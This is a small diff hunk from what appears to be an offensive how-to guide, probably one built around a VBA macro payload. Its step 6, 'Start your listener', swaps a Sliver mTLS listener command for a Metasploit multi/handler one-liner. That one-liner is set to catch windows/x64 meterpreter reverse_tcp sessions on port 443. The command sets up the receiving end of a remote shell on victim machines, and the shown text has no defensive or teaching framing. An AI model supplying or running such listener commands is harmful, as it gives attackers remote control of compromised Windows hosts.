@@ -75,5 +75,5 @@ End Sub
 
 **6. Start your listener:**
 ```bash
-sliver > mtls --lhost <IP> --lport 443
+msfconsole -x "use exploit/multi/handler; set PAYLOAD windows/x64/meterpreter/reverse_tcp; set LHOST <IP>; set LPORT 443; set ExitOnSession false; exploit -j"
 ```
